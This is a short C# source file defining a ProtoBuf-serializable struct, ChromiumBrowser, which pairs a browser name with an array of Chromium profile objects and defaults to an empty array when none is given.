

using ProtoBuf;


namespace InvokedCommon.Structs
{
	[ProtoContract]
	public struct ChromiumBrowser
	{
		[ProtoMember(1)]
		public string browserName;
		[ProtoMember(2)]
		public ChromiumProfile[] profiles;

		public ChromiumBrowser(ChromiumProfile[] _profiles, string _browserName)
		{
			this.browserName = _browserName;
			if (_profiles == null)
				this.profiles = new ChromiumProfile[0];
			else
				this.profiles = _profiles;
		}
	}
}